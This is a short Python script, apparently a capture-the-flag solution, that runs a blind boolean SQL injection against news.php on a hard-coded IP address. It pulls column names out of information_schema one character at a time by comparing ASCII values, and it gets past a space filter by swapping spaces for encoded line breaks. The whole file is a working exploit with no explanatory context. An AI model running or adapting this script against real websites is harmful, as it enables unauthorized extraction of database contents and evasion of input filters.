import requests
url = "http://118.190.134.8/t1/news.php?id=4 and ascii" \
      "(substr((select group_concat(column_name) from information_schema.columns " \
      "where table_name=0x6e657773 limit 1)from "
for m in range(100):
    url1 = url + str(m) + " for 1))="
    for n in range(33, 127):
        url2 = url1 + str(n) + "#"
        url3 = url2.replace(" ", "%0d%0a")
        re = requests.get(url3)
        #print re.content
        if 'flag' in re.content:
            print chr(n)
            break


